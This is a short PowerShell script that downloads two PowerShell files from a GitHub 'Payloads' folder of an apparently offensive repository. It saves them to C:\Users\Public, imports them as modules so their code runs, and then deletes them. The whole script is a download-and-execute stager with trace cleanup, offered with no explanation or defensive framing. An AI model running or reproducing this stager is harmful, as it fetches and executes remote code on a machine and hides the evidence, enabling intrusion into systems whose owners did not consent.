$url="https://raw.githubusercontent.com/cmndcntrlcyber/one-attck-per-time/main/Payloads/pwsh/WonTonPlatypus.ps1"
$url2="https://raw.githubusercontent.com/cmndcntrlcyber/one-attck-per-time/main/Payloads/pwsh/AppleDogPeas.ps1"
$tempFilePath = "C:\Users\Public\WTP.ps1"
$tempFilePath2 = "C:\Users\Public\ADP.ps1"
Invoke-WebRequest $url -OutFile $tempFilePath
Invoke-WebRequest $url2 -OutFile $tempFilePath2
Import-Module $tempFilePath
Import-Module $tempFilePath2
Remove-Item $tempFilePath
Remove-Item $tempFilePath2